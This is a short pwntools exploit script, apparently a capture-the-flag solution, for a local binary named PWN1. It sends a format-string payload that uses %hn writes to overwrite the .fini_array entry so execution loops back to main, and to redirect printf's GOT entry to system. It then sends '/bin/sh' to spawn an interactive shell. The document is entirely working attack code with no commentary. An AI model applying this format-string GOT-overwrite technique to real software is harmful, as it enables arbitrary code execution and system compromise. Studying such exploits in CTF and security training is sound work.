from pwn import*
p=process('./PWN1')

context.log_level='debug'
system=0x080483d0
main=0x08048534
fini_array=0x0804979C
printf_got=0x804989c


payload =  p32(fini_array+2) +  p32(printf_got+2)  +p32(printf_got)+p32(fini_array)
payload += "%"+str(0x804-0x10)+"c%4$hn"+ "%5$hn" + "%" + str(0x83d0-0x0804) + "c%6$hn"+  "%" + str(0x8534-0x83d0)+"c%7$hn" 

p.sendlineafter("name?",payload)
p.send("/bin/sh\x00")
p.interactive()
